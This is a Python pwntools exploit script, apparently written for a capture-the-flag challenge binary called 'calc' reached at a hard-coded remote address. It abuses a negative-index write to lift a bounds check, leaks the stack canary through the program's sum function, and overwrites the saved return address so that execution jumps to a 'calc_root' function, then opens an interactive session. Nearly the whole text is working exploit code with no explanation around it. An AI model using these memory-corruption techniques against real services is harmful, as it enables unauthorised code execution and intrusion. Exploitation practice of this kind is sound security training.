import subprocess
import struct
from pwn import *

context.binary = exe = ELF('./calc', checksec=False)
# context.log_level = 'debug'

def setnumber(pos, number):
	p.sendlineafter(b'choice:', b'1')
	p.sendlineafter(b'Please input the pos:', '{}'.format(pos).encode())
	p.sendlineafter(b'Please input the number:', '{}'.format(number).encode())

def calculate(many):
	p.sendlineafter(b'choice:', b'2')
	p.sendlineafter(b'How many?\n', '{}'.format(many).encode())
	# Result recv outside

def finish(data):
	p.sendlineafter(b'choice:', b'3')
	p.sendafter(b'What\'s your name?', data)

def GDB():
	command = '''
	b*0x00000000004013ff
	b*0x00000000004014f8
	b*0x000000000040145e
	b*0x00000000004014b2
	b*0x4015aa
	c
	'''
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['/usr/bin/x-terminal-emulator', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb

# p = process('./calc')
p = connect('34.136.108.210', 40004)

##################################
### Stage 1: Leak stack canary ###
##################################
log.info('Leaking stack canary...')

# change the checker from 0x14 to 0x100
setnumber(-2, 0x100)

# Set all nearby stack to 0 in order not to cause 
# integer overflow
for i in range(23):
	setnumber(i, 0)

# leak stack canary
calculate(24)
data = int(p.recvline()[:-1].split(b':')[1])
canary = u64(struct.pack('<q', data))
log.success('Leak canary: ' + hex(canary))

#########################
### Stage 2: Get flag ###
#########################
log.info('Getting flag...')

# Remember to set context.binary before using 
# fit() and flat()
payload = fit({
	0x18: flat(canary),
	0x28: flat(exe.sym['calc_root'])
	})
finish(payload)

p.interactive()